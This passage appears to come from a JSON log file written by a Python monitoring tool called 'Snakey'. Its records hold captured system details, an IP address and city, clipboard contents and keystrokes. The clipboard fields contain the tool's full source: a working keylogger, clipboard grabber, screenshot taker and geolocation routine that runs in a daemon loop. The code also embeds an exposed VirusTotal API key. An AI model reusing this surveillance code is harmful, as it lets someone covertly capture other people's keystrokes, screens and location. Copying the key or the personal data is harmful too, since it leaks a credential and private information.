os.environ.get(\"APPDATA\", \"\"),\r\n        \"LocalAppData\": os.environ.get(\"LOCALAPPDATA\", \"\")\r\n    }\r\n\r\n    dir_status = {}\r\n    for name, path in important_dirs.items():\r\n        if os.path.exists(path):\r\n            try:\r\n                file_count = len(os.listdir(path))\r\n                dir_status[name] = f\"Found ({file_count} items)\"\r\n            except Exception as e:\r\n                dir_status[name] = f\"Error reading contents: {e}\"\r\n        else:\r\n            dir_status[name] = \"Not found\"\r\n    return dir_status\r\n\r\ndef check_stop_file():\r\n    return os.path.exists(os.path.join(base_path, \"stop_snakey.txt\"))\r\n\r\ndef log_to_wazuh_file(data):\r\n    try:\r\n        with open(wazuh_log_file, \"a\") as f:\r\n            f.write(json.dumps(data) + \"\\n\")\r\n        print(\"[INFO] Log written to Wazuh-compatible file.\")\r\n    except Exception as e:\r\n        print(f\"[ERROR] Wazuh log file write failed: {e}\")\r\n\r\ndef collect_full_session():\r\n    session_log = {\r\n        \"timestamp\": datetime.now().isoformat(),\r\n        \"system\": {},\r\n        \"clipboard\": \"\",\r\n        \"keystrokes\": \"\",\r\n        \"screenshot_taken\": False,\r\n        \"alerts\": [],\r\n        \"virustotal\": {},\r\n        \"important_dirs\": {}\r\n    }\r\n\r\n    try:\r\n        session_log[\"system\"][\"username\"] = getpass.getuser()\r\n        hostname = socket.gethostname()\r\n        session_log[\"system\"][\"hostname\"] = hostname\r\n        session_log[\"system\"][\"private_ip\"] = socket.gethostbyname(hostname)\r\n\r\n        # === Public IP and ISP lookup ===\r\n        try:\r\n            ip_info = requests.get(\"https://ipinfo.io/json\").json()\r\n            session_log[\"system\"][\"public_ip\"] = ip_info.get(\"ip\")\r\n            session_log[\"system\"][\"country\"] = ip_info.get(\"country\")\r\n            session_log[\"system\"][\"region\"] = ip_info.get(\"region\")\r\n            session_log[\"system\"][\"city\"] = ip_info.get(\"city\")\r\n            session_log[\"system\"][\"isp\"] = ip_info.get(\"org\", \"Unknown\")\r\n\r\n            if ip_info.get(\"country\") and ip_info[\"country\"] not in known_countries:\r\n                session_log[\"alerts\"].append(f\"Access from untrusted country: {ip_info['country']}\")\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"IP info lookup failed: {e}\")\r\n\r\n        session_log[\"system\"][\"processor\"] = platform.processor()\r\n        session_log[\"system\"][\"os\"] = platform.system() + \" \" + platform.version()\r\n        session_log[\"system\"][\"machine\"] = platform.machine()\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"System info error: {e}\")\r\n\r\n    try:\r\n        win32clipboard.OpenClipboard()\r\n        try:\r\n            session_log[\"clipboard\"] = win32clipboard.GetClipboardData()\r\n        except TypeError:\r\n            session_log[\"clipboard\"] = \"Clipboard is empty.\"\r\n        win32clipboard.CloseClipboard()\r\n        session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Clipboard error: {e}\")\r\n\r\n    try:\r\n        screenshot_path = os.path.join(base_path, screenshot_information)\r\n        im = ImageGrab.grab()\r\n        im.save(screenshot_path)\r\n        session_log[\"screenshot_taken\"] = True\r\n        session_log[\"screenshot_hash\"] = hash_file(screenshot_path)\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Screenshot error: {e}\")\r\n\r\n    if session_log[\"clipboard\"].startswith(\"http\"):\r\n        vt_result = vt_lookup_url(session_log[\"clipboard\"])\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"clipboard_url\"] = vt_result\r\n\r\n    if session_log.get(\"screenshot_taken\"):\r\n        vt_result = vt_lookup_file(screenshot_path)\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"screenshot_file\"] = vt_result\r\n\r\n    keys = []\r\n    def on_press(key):\r\n        if hasattr(key, 'char'):\r\n            keys.append(key.char)\r\n        elif key == Key.space:\r\n            keys.append(' ')\r\n\r\n    print(\"[INFO] Keylogger running. Create 'stop_snakey.txt' to terminate.\")\r\n    with Listener(on_press=on_press) as listener:\r\n        start_time = time.time()\r\n        while time.time() - start_time < 10:\r\n            time.sleep(1)\r\n            if check_stop_file():\r\n                print(\"[INFO] Stop file detected. Exiting keylogger.\")\r\n                break\r\n\r\n    session_log[\"keystrokes\"] = ''.join(keys)\r\n    session_log[\"important_dirs\"] = check_important_directories()\r\n    log_string = json.dumps(session_log, sort_keys=True)\r\n    session_log[\"log_hash\"] = hash_text(log_string)\r\n\r\n    try:\r\n        # Load existing logs\r\n        if os.path.exists(json_log_path):\r\n            with open(json_log_path, \"r\") as f:\r\n                logs = json.load(f)\r\n        else:\r\n            logs = []\r\n\r\n        logs.append(session_log)\r\n        with open(json_log_path, \"w\") as f:\r\n            json.dump(logs, f, indent=4)\r\n\r\n        print(\"[SUCCESS] Log saved to JSON file.\")\r\n\r\n        # Load or initialize ledger as a list of dicts\r\n        if os.path.exists(hash_ledger_path):\r\n            with open(hash_ledger_path, \"r\") as f:\r\n                ledger = json.load(f)\r\n            # If ledger is a list of strings (legacy), convert to list of dicts\r\n            if ledger and isinstance(ledger[0], str):\r\n                ledger = [{\r\n                    \"timestamp\": \"unknown\",\r\n                    \"log_hash\": h,\r\n                    \"previous_hash\": \"0\" * 64,\r\n                    \"chained_hash\": \"0\" * 64\r\n                } for h in ledger]\r\n        else:\r\n            ledger = []\r\n\r\n        previous_hash = ledger[-1][\"log_hash\"] if ledger else \"0\" * 64\r\n        chained_hash_input = session_log[\"log_hash\"] + previous_hash\r\n        chained_hash = hash_text(chained_hash_input)\r\n\r\n        ledger_entry = {\r\n            \"timestamp\": session_log[\"timestamp\"],\r\n            \"log_hash\": session_log[\"log_hash\"],\r\n            \"previous_hash\": previous_hash,\r\n            \"chained_hash\": chained_hash\r\n        }\r\n\r\n        ledger.append(ledger_entry)\r\n\r\n        with open(hash_ledger_path, \"w\") as f:\r\n            json.dump(ledger, f, indent=4)\r\n\r\n        print(\"[SUCCESS] Blockchain-style hash ledger updated.\")\r\n\r\n        hash_list = [entry[\"log_hash\"] for entry in ledger]\r\n        merkle_root = build_merkle_tree(hash_list)\r\n\r\n        with open(merkle_root_path, \"w\") as f:\r\n            f.write(merkle_root)\r\n\r\n        print(\"[SUCCESS] Merkle root saved.\")\r\n    except Exception as e:\r\n        print(f\"[ERROR] Failed to save log or update ledger: {e}\")\r\n\r\n    return session_log\r\n\r\n# === Main Daemon Loop ===\r\nif __name__ == \"__main__\":\r\n    print(\"[INFO] Starting Snakey in daemon mode...\")\r\n\r\n    while True:\r\n        if check_stop_file():\r\n            print(\"[INFO] Snakey terminated by stop file.\")\r\n            break\r\n\r\n        session_log = collect_full_session()\r\n        log_to_wazuh_file(session_log)\r\n        time.sleep(15)\r\n\r\n    stop_file_path = os.path.join(base_path, \"stop_snakey.txt\")\r\n    if os.path.exists(stop_file_path):\r\n        os.remove(stop_file_path)\r\n        print(\"[INFO] Stop file removed.\")\r\n", "keystrokes": "stop _snakey", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (750 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "99ce0cbdec63535bc7291b21a7fd6a36dbd945b24d690bdd623a690f8e4c7c03", "screenshot_hash": "e43360b6048ff8391f1a922d5f342cbbc05f48f4114aa58fb9b8f4e1891d8fa0", "log_hash": "279463da8121336554a82b73281abbdae11cda02c71ddb6f4b51b1d04e0637a9"}
{"timestamp": "2025-05-21T12:54:16.960308", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "import os\r\nimport time\r\nimport json\r\nimport socket\r\nimport getpass\r\nimport hashlib\r\nimport platform\r\nfrom datetime import datetime\r\nfrom requests import get, post\r\nfrom pynput.keyboard import Key, Listener\r\nfrom PIL import ImageGrab\r\nimport win32clipboard\r\nfrom cryptography.fernet import Fernet\r\nimport requests\r\n\r\n# === Configuration ===\r\nbase_path = \"C:/Users/ktmdu/PycharmProjects/Snakey/Cryptography\"\r\nencrypted_path = os.path.join(base_path, \"encrypted/\")\r\nos.makedirs(encrypted_path, exist_ok=True)\r\n\r\njson_log_path = os.path.join(base_path, \"snakey_log.json\")\r\nhash_ledger_path = os.path.join(base_path, \"hash_ledger.json\")\r\nmerkle_root_path = os.path.join(base_path, \"merkle_root.txt\")\r\nwazuh_log_file = os.path.join(base_path, \"wazuh_alerts.log\")\r\n\r\nscreenshot_information = \"screenshot.png\"\r\nkey_path = os.path.join(encrypted_path, \"key.key\")\r\nknown_countries = [\"Spain\"]\r\n\r\n# === VirusTotal Config ===\r\nVT_API_KEY = \"c5f762cd3b75395566d2cce05125d25c40af4ac71ce73801e936080938784b46\"\r\nVT_URL_LOOKUP = \"https://www.virustotal.com/api/v3/urls/\"\r\nVT_FILE_LOOKUP = \"https://www.virustotal.com/api/v3/files/\"\r\nVT_HEADER = {\"x-apikey\": VT_API_KEY}\r\n\r\n# === AbuseIPDB Config ===\r\nABUSE_API_KEY = \"your_abuseipdb_api_key_here\"\r\n\r\nif not os.path.exists(key_path):\r\n    print(\"[ERROR] Encryption key not found! Run GenerateKey.py first.\")\r\n    exit(1)\r\n\r\nwith open(key_path, \"rb\") as key_file:\r\n    key = key_file.read()\r\n\r\nfernet = Fernet(key)\r\n\r\n# === Utility Functions ===\r\ndef hash_file(filepath):\r\n    sha256_hash = hashlib.sha256()\r\n    try:\r\n        with open(filepath, \"rb\") as f:\r\n            for byte_block in iter(lambda: f.read(4096), b\"\"):\r\n                sha256_hash.update(byte_block)\r\n        return sha256_hash.hexdigest()\r\n    except Exception as e:\r\n        print(f\"[ERROR] Hashing failed for {filepath}: {e}\")\r\n        return None\r\n\r\ndef hash_text(text):\r\n    return hashlib.sha256(text.encode()).hexdigest()\r\n\r\ndef build_merkle_tree(hashes):\r\n    if not hashes:\r\n        return None\r\n    while len(hashes) > 1:\r\n        if len(hashes) % 2 != 0:\r\n            hashes.append(hashes[-1])\r\n        new_hashes = []\r\n        for i in range(0, len(hashes), 2):\r\n            combined = hashes[i] + hashes[i + 1]\r\n            new_hashes.append(hash_text(combined))\r\n        hashes = new_hashes\r\n    return hashes[0]\r\n\r\ndef vt_lookup_url(url):\r\n    try:\r\n        url_id = hashlib.sha256(url.encode()).hexdigest()\r\n        response = requests.get(VT_URL_LOOKUP + url_id, headers=VT_HEADER)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n    except Exception as e:\r\n        print(f\"[ERROR] VT URL lookup failed: {e}\")\r\n    return {}\r\n\r\ndef vt_lookup_file(file_path):\r\n    try:\r\n        file_hash = hash_file(file_path)\r\n        response = requests.get(VT_FILE_LOOKUP + file_hash, headers=VT_HEADER)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n    except Exception as e:\r\n        print(f\"[ERROR] VT File lookup failed: {e}\")\r\n    return {}\r\n\r\ndef check_ip_reputation_abuseipdb(ip):\r\n    url = \"https://api.abuseipdb.com/api/v2/check\"\r\n    headers = {\r\n        \"Accept\": \"application/json\",\r\n        \"Key\": ABUSE_API_KEY\r\n    }\r\n    params = {\r\n        \"ipAddress\": ip,\r\n        \"maxAgeInDays\": \"90\"\r\n    }\r\n    try:\r\n        response = requests.get(url, headers=headers, params=params)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return {\r\n                \"abuse_score\": data[\"data\"][\"abuseConfidenceScore\"],\r\n                \"total_reports\": data[\"data\"][\"totalReports\"],\r\n                \"country\": data[\"data\"][\"countryCode\"],\r\n                \"isp\": data[\"data\"][\"isp\"],\r\n                \"domain\": data[\"data\"][\"domain\"],\r\n                \"last_reported\": data[\"data\"][\"lastReportedAt\"]\r\n            }\r\n    except Exception as e:\r\n        print(f\"[ERROR] AbuseIPDB lookup failed: {e}\")\r\n    return {}\r\n\r\ndef check_important_directories():\r\n    important_dirs = {\r\n        \"Desktop\": os.path.join(os.path.expanduser(\"~\"), \"Desktop\"),\r\n        \"Documents\": os.path.join(os.path.expanduser(\"~\"), \"Documents\"),\r\n        \"Downloads\": os.path.join(os.path.expanduser(\"~\"), \"Downloads\"),\r\n        \"AppData\": os.environ.get(\"APPDATA\", \"\"),\r\n        \"LocalAppData\": os.environ.get(\"LOCALAPPDATA\", \"\")\r\n    }\r\n    dir_status = {}\r\n    for name, path in important_dirs.items():\r\n        if os.path.exists(path):\r\n            try:\r\n                file_count = len(os.listdir(path))\r\n                dir_status[name] = f\"Found ({file_count} items)\"\r\n            except Exception as e:\r\n                dir_status[name] = f\"Error reading contents: {e}\"\r\n        else:\r\n            dir_status[name] = \"Not found\"\r\n    return dir_status\r\n\r\ndef check_stop_file():\r\n    return os.path.exists(os.path.join(base_path, \"stop_snakey.txt\"))\r\n\r\ndef log_to_wazuh_file(data):\r\n    try:\r\n        with open(wazuh_log_file, \"a\") as f:\r\n            f.write(json.dumps(data) + \"\\n\")\r\n        print(\"[INFO] Log written to Wazuh-compatible file.\")\r\n    except Exception as e:\r\n        print(f\"[ERROR] Wazuh log file write failed: {e}\")\r\n\r\ndef collect_full_session():\r\n    session_log = {\r\n        \"timestamp\": datetime.now().isoformat(),\r\n        \"system\": {},\r\n        \"clipboard\": \"\",\r\n        \"keystrokes\": \"\",\r\n        \"screenshot_taken\": False,\r\n        \"alerts\": [],\r\n        \"virustotal\": {},\r\n        \"abuseipdb\": {},\r\n        \"important_dirs\": {}\r\n    }\r\n    try:\r\n        session_log[\"system\"][\"username\"] = getpass.getuser()\r\n        hostname = socket.gethostname()\r\n        session_log[\"system\"][\"hostname\"] = hostname\r\n        session_log[\"system\"][\"private_ip\"] = socket.gethostbyname(hostname)\r\n\r\n        ip_info = requests.get(\"https://ipinfo.io/json\").json()\r\n        public_ip = ip_info.get(\"ip\")\r\n        session_log[\"system\"].update({\r\n            \"public_ip\": public_ip,\r\n            \"country\": ip_info.get(\"country\"),\r\n            \"region\": ip_info.get(\"region\"),\r\n            \"city\": ip_info.get(\"city\"),\r\n            \"isp\": ip_info.get(\"org\", \"Unknown\")\r\n        })\r\n\r\n        if ip_info.get(\"country\") and ip_info[\"country\"] not in known_countries:\r\n            session_log[\"alerts\"].append(f\"Access from untrusted country: {ip_info['country']}\")\r\n\r\n        abuse_info = check_ip_reputation_abuseipdb(public_ip)\r\n        if abuse_info:\r\n            session_log[\"abuseipdb\"] = abuse_info\r\n            if abuse_info.get(\"abuse_score\", 0) > 50:\r\n                session_log[\"alerts\"].append(f\"High abuse score IP ({abuse_info['abuse_score']}): {public_ip}\")\r\n\r\n        session_log[\"system\"][\"processor\"] = platform.processor()\r\n        session_log[\"system\"][\"os\"] = platform.system() + \" \" + platform.version()\r\n        session_log[\"system\"][\"machine\"] = platform.machine()\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"System info error: {e}\")\r\n\r\n    try:\r\n        win32clipboard.OpenClipboard()\r\n        try:\r\n            session_log[\"clipboard\"] = win32clipboard.GetClipboardData()\r\n        except TypeError:\r\n            session_log[\"clipboard\"] = \"Clipboard is empty.\"\r\n        win32clipboard.CloseClipboard()\r\n        session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Clipboard error: {e}\")\r\n\r\n    try:\r\n        screenshot_path = os.path.join(base_path, screenshot_information)\r\n        im = ImageGrab.grab()\r\n        im.save(screenshot_path)\r\n        session_log[\"screenshot_taken\"] = True\r\n        session_log[\"screenshot_hash\"] = hash_file(screenshot_path)\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Screenshot error: {e}\")\r\n\r\n    if session_log[\"clipboard\"].startswith(\"http\"):\r\n        vt_result = vt_lookup_url(session_log[\"clipboard\"])\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"clipboard_url\"] = vt_result\r\n\r\n    if session_log.get(\"screenshot_taken\"):\r\n        vt_result = vt_lookup_file(screenshot_path)\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"screenshot_file\"] = vt_result\r\n\r\n    keys = []\r\n    def on_press(key):\r\n        if hasattr(key, 'char'):\r\n            keys.append(key.char)\r\n        elif key == Key.space:\r\n            keys.append(' ')\r\n\r\n    print(\"[INFO] Keylogger running. Create 'stop_snakey.txt' to terminate.\")\r\n    with Listener(on_press=on_press) as listener:\r\n        start_time = time.time()\r\n        while time.time() - start_time < 10:\r\n            time.sleep(1)\r\n            if check_stop_file():\r\n                print(\"[INFO] Stop file detected. Exiting keylogger.\")\r\n                break\r\n\r\n    session_log[\"keystrokes\"] = ''.join(keys)\r\n    session_log[\"important_dirs\"] = check_important_directories()\r\n    log_string = json.dumps(session_log, sort_keys=True)\r\n    session_log[\"log_hash\"] = hash_text(log_string)\r\n\r\n    try:\r\n        if os.path.exists(json_log_path):\r\n            with open(json_log_path, \"r\") as f:\r\n                logs = json.load(f)\r\n        else:\r\n            logs = []\r\n\r\n        logs.append(session_log)\r\n        with open(json_log_path, \"w\") as f:\r\n            json.dump(logs, f, indent=4)\r\n\r\n        print(\"[SUCCESS] Log saved to JSON file.\")\r\n\r\n        if os.path.exists(hash_ledger_path):\r\n            with open(hash_ledger_path, \"r\") as f:\r\n                ledger = json.load(f)\r\n        else:\r\n            ledger = []\r\n\r\n        previous_hash = ledger[-1][\"log_hash\"] if ledger else \"0\" * 64\r\n        chained_hash = hash_text(session_log[\"log_hash\"] + previous_hash)\r\n\r\n        ledger.append({\r\n            \"timestamp\": session_log[\"timestamp\"],\r\n            \"log_hash\": session_log[\"log_hash\"],\r\n            \"previous_hash\": previous_hash,\r\n            \"chained_hash\": chained_hash\r\n        })\r\n\r\n        with open(hash_ledger_path, \"w\") as f:\r\n            json.dump(ledger, f, indent=4)\r\n\r\n        print(\"[SUCCESS] Blockchain-style hash ledger updated.\")\r\n\r\n        merkle_root = build_merkle_tree([entry[\"log_hash\"] for entry in ledger])\r\n        with open(merkle_root_path, \"w\") as f:\r\n            f.write(merkle_root)\r\n\r\n        print(\"[SUCCESS] Merkle root saved.\")\r\n    except Exception as e:\r\n        print(f\"[ERROR] Failed to save log or update ledger: {e}\")\r\n\r\n    return session_log\r\n\r\n# === Main Daemon Loop ===\r\nif __name__ == \"__main__\":\r\n    print(\"[INFO] Starting Snakey in daemon mode...\")\r\n\r\n    while True:\r\n        if check_stop_file():\r\n            print(\"[INFO] Snakey terminated by stop file.\")\r\n            break\r\n\r\n        session_log = collect_full_session()\r\n        log_to_wazuh_file(session_log)\r\n        time.sleep(15)\r\n\r\n    stop_file_path = os.path.join(base_path, \"stop_snakey.txt\")\r\n    if os.path.exists(stop_file_path):\r\n        os.remove(stop_file_path)\r\n        print(\"[INFO] Stop file removed.\")\r\n", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "abuseipdb": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (750 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "fa0f1dcdaa3613bb429393bd0c5d12b6604b63ba7e06e3b07a5363d7b19ebd08", "screenshot_hash": "27b151404138bf550c235b34d82e07675a0a3c6129518cd6ab30da35dd7709c3", "log_hash": "3c9d4ef1fdb488ba3b8a985eb6eb95dd638a3145df87ee7dc2a5ca8168274ce4"}
{"timestamp": "2025-05-21T12:54:43.501673", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "import os\r\nimport time\r\nimport json\r\nimport socket\r\nimport getpass\r\nimport hashlib\r\nimport platform\r\nfrom datetime import datetime\r\nfrom requests import get, post\r\nfrom pynput.keyboard import Key, Listener\r\nfrom PIL import ImageGrab\r\nimport win32clipboard\r\nfrom cryptography.fernet import Fernet\r\nimport requests\r\n\r\n# === Configuration ===\r\nbase_path = \"C:/Users/ktmdu/PycharmProjects/Snakey/Cryptography\"\r\nencrypted_path = os.path.join(base_path, \"encrypted/\")\r\nos.makedirs(encrypted_path, exist_ok=True)\r\n\r\njson_log_path = os.path.join(base_path, \"snakey_log.json\")\r\nhash_ledger_path = os.path.join(base_path, \"hash_ledger.json\")\r\nmerkle_root_path = os.path.join(base_path, \"merkle_root.txt\")\r\nwazuh_log_file = os.path.join(base_path, \"wazuh_alerts.log\")\r\n\r\nscreenshot_information = \"screenshot.png\"\r\nkey_path = os.path.join(encrypted_path, \"key.key\")\r\nknown_countries = [\"Spain\"]\r\n\r\n# === VirusTotal Config ===\r\nVT_API_KEY = \"c5f762cd3b75395566d2cce05125d25c40af4ac71ce73801e936080938784b46\"\r\nVT_URL_LOOKUP = \"https://www.virustotal.com/api/v3/urls/\"\r\nVT_FILE_LOOKUP = \"https://www.virustotal.com/api/v3/files/\"\r\nVT_HEADER = {\"x-apikey\": VT_API_KEY}\r\n\r\n# === AbuseIPDB Config ===\r\nABUSE_API_KEY = \"your_abuseipdb_api_key_here\"\r\n\r\nif not os.path.exists(key_path):\r\n    print(\"[ERROR] Encryption key not found! Run GenerateKey.py first.\")\r\n    exit(1)\r\n\r\nwith open(key_path, \"rb\") as key_file:\r\n    key = key_file.read()\r\n\r\nfernet = Fernet(key)\r\n\r\n# === Utility Functions ===\r\ndef hash_file(filepath):\r\n    sha256_hash = hashlib.sha256()\r\n    try:\r\n        with open(filepath, \"rb\") as f:\r\n            for byte_block in iter(lambda: f.read(4096), b\"\"):\r\n                sha256_hash.update(byte_block)\r\n        return sha256_hash.hexdigest()\r\n    except Exception as e:\r\n        print(f\"[ERROR] Hashing failed for {filepath}: {e}\")\r\n        return None\r\n\r\ndef hash_text(text):\r\n    return hashlib.sha256(text.encode()).hexdigest()\r\n\r\ndef build_merkle_tree(hashes):\r\n    if not hashes:\r\n        return None\r\n    while len(hashes) > 1:\r\n        if len(hashes) % 2 != 0:\r\n            hashes.append(hashes[-1])\r\n        new_hashes = []\r\n        for i in range(0, len(hashes), 2):\r\n            combined = hashes[i] + hashes[i + 1]\r\n            new_hashes.append(hash_text(combined))\r\n        hashes = new_hashes\r\n    return hashes[0]\r\n\r\ndef vt_lookup_url(url):\r\n    try:\r\n        url_id = hashlib.sha256(url.encode()).hexdigest()\r\n        response = requests.get(VT_URL_LOOKUP + url_id, headers=VT_HEADER)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n    except Exception as e:\r\n        print(f\"[ERROR] VT URL lookup failed: {e}\")\r\n    return {}\r\n\r\ndef vt_lookup_file(file_path):\r\n    try:\r\n        file_hash = hash_file(file_path)\r\n        response = requests.get(VT_FILE_LOOKUP + file_hash, headers=VT_HEADER)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n    except Exception as e:\r\n        print(f\"[ERROR] VT File lookup failed: {e}\")\r\n    return {}\r\n\r\ndef check_ip_reputation_abuseipdb(ip):\r\n    url = \"https://api.abuseipdb.com/api/v2/check\"\r\n    headers = {\r\n        \"Accept\": \"application/json\",\r\n        \"Key\": ABUSE_API_KEY\r\n    }\r\n    params = {\r\n        \"ipAddress\": ip,\r\n        \"maxAgeInDays\": \"90\"\r\n    }\r\n    try:\r\n        response = requests.get(url, headers=headers, params=params)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return {\r\n                \"abuse_score\": data[\"data\"][\"abuseConfidenceScore\"],\r\n                \"total_reports\": data[\"data\"][\"totalReports\"],\r\n                \"country\": data[\"data\"][\"countryCode\"],\r\n                \"isp\": data[\"data\"][\"isp\"],\r\n                \"domain\": data[\"data\"][\"domain\"],\r\n                \"last_reported\": data[\"data\"][\"lastReportedAt\"]\r\n            }\r\n    except Exception as e:\r\n        print(f\"[ERROR] AbuseIPDB lookup failed: {e}\")\r\n    return {}\r\n\r\ndef check_important_directories():\r\n    important_dirs = {\r\n        \"Desktop\": os.path.join(os.path.expanduser(\"~\"), \"Desktop\"),\r\n        \"Documents\": os.path.join(os.path.expanduser(\"~\"), \"Documents\"),\r\n        \"Downloads\": os.path.join(os.path.expanduser(\"~\"), \"Downloads\"),\r\n        \"AppData\": os.environ.get(\"APPDATA\", \"\"),\r\n        \"LocalAppData\": os.environ.get(\"LOCALAPPDATA\", \"\")\r\n    }\r\n    dir_status = {}\r\n    for name, path in important_dirs.items():\r\n        if os.path.exists(path):\r\n            try:\r\n                file_count = len(os.listdir(path))\r\n                dir_status[name] = f\"Found ({file_count} items)\"\r\n            except Exception as e:\r\n                dir_status[name] = f\"Error reading contents: {e}\"\r\n        else:\r\n            dir_status[name] = \"Not found\"\r\n    return dir_status\r\n\r\ndef check_stop_file():\r\n    return os.path.exists(os.path.join(base_path, \"stop_snakey.txt\"))\r\n\r\ndef log_to_wazuh_file(data):\r\n    try:\r\n        with open(wazuh_log_file, \"a\") as f:\r\n            f.write(json.dumps(data) + \"\\n\")\r\n        print(\"[INFO] Log written to Wazuh-compatible file.\")\r\n    except Exception as e:\r\n        print(f\"[ERROR] Wazuh log file write failed: {e}\")\r\n\r\ndef collect_full_session():\r\n    session_log = {\r\n        \"timestamp\": datetime.now().isoformat(),\r\n        \"system\": {},\r\n        \"clipboard\": \"\",\r\n        \"keystrokes\": \"\",\r\n        \"screenshot_taken\": False,\r\n        \"alerts\": [],\r\n        \"virustotal\": {},\r\n        \"abuseipdb\": {},\r\n        \"important_dirs\": {}\r\n    }\r\n    try:\r\n        session_log[\"system\"][\"username\"] = getpass.getuser()\r\n        hostname = socket.gethostname()\r\n        session_log[\"system\"][\"hostname\"] = hostname\r\n        session_log[\"system\"][\"private_ip\"] = socket.gethostbyname(hostname)\r\n\r\n        ip_info = requests.get(\"https://ipinfo.io/json\").json()\r\n        public_ip = ip_info.get(\"ip\")\r\n        session_log[\"system\"].update({\r\n            \"public_ip\": public_ip,\r\n            \"country\": ip_info.get(\"country\"),\r\n            \"region\": ip_info.get(\"region\"),\r\n            \"city\": ip_info.get(\"city\"),\r\n            \"isp\": ip_info.get(\"org\", \"Unknown\")\r\n        })\r\n\r\n        if ip_info.get(\"country\") and ip_info[\"country\"] not in known_countries:\r\n            session_log[\"alerts\"].append(f\"Access from untrusted country: {ip_info['country']}\")\r\n\r\n        abuse_info = check_ip_reputation_abuseipdb(public_ip)\r\n        if abuse_info:\r\n            session_log[\"abuseipdb\"] = abuse_info\r\n            if abuse_info.get(\"abuse_score\", 0) > 50:\r\n                session_log[\"alerts\"].append(f\"High abuse score IP ({abuse_info['abuse_score']}): {public_ip}\")\r\n\r\n        session_log[\"system\"][\"processor\"] = platform.processor()\r\n        session_log[\"system\"][\"os\"] = platform.system() + \" \" + platform.version()\r\n        session_log[\"system\"][\"machine\"] = platform.machine()\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"System info error: {e}\")\r\n\r\n    try:\r\n        win32clipboard.OpenClipboard()\r\n        try:\r\n            session_log[\"clipboard\"] = win32clipboard.GetClipboardData()\r\n        except TypeError:\r\n            session_log[\"clipboard\"] = \"Clipboard is empty.\"\r\n        win32clipboard.CloseClipboard()\r\n        session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Clipboard error: {e}\")\r\n\r\n    try:\r\n        screenshot_path = os.path.join(base_path, screenshot_information)\r\n        im = ImageGrab.grab()\r\n        im.save(screenshot_path)\r\n        session_log[\"screenshot_taken\"] = True\r\n        session_log[\"screenshot_hash\"] = hash_file(screenshot_path)\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Screenshot error: {e}\")\r\n\r\n    if session_log[\"clipboard\"].startswith(\"http\"):\r\n        vt_result = vt_lookup_url(session_log[\"clipboard\"])\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"clipboard_url\"] = vt_result\r\n\r\n    if session_log.get(\"screenshot_taken\"):\r\n        vt_result = vt_lookup_file(screenshot_path)\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"screenshot_file\"] = vt_result\r\n\r\n    keys = []\r\n    def on_press(key):\r\n        if hasattr(key, 'char'):\r\n            keys.append(key.char)\r\n        elif key == Key.space:\r\n            keys.append(' ')\r\n\r\n    print(\"[INFO] Keylogger running. Create 'stop_snakey.txt' to terminate.\")\r\n    with Listener(on_press=on_press) as listener:\r\n        start_time = time.time()\r\n        while time.time() - start_time < 10:\r\n            time.sleep(1)\r\n            if check_stop_file():\r\n                print(\"[INFO] Stop file detected. Exiting keylogger.\")\r\n                break\r\n\r\n    session_log[\"keystrokes\"] = ''.join(keys)\r\n    session_log[\"important_dirs\"] = check_important_directories()\r\n    log_string = json.dumps(session_log, sort_keys=True)\r\n    session_log[\"log_hash\"] = hash_text(log_string)\r\n\r\n    try:\r\n        if os.path.exists(json_log_path):\r\n            with open(json_log_path, \"r\") as f:\r\n                logs = json.load(f)\r\n        else:\r\n            logs = []\r\n\r\n        